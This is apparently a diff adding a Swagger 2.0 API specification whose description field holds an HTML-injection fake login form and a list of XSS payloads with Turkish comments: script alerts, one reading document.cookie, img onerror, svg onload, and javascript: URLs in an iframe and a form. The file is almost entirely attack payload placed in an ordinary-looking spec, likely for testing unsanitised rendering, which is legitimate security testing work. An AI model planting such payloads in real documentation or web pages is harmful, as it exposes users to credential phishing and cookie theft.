@@ -1,0 +1,53 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: '<div class="login-form">
+    <div class="heading">
+        <h1>HTML Injection : Fake Login</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
+        </form>
+    </div>
+    <!-- XSS Payloads -->
+    <!-- Basit alert -->
+    <script>alert(1);</script>
+
+    <!-- document.cookie ile XSS -->
+    <script>alert(document.cookie);</script>
+
+    <!-- image tag'inde onerror ile XSS -->
+    <img src="invalid" onerror="alert(\'XSS via onerror\');">
+
+    <!-- SVG ile XSS -->
+    <svg onload="alert(\'XSS via SVG\')"></svg>
+
+    <!-- iframe ile XSS -->
+    <iframe src="javascript:alert(\'XSS via iframe\');"></iframe>
+
+    <!-- form action ile XSS -->
+    <form action="javascript:alert(\'XSS via form\')">
+      <input type="submit" value="Click Me">
+    </form>
+
+    <!-- input value ile XSS -->
+    <input type="text" value="</script><script>alert(2)</script>">
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
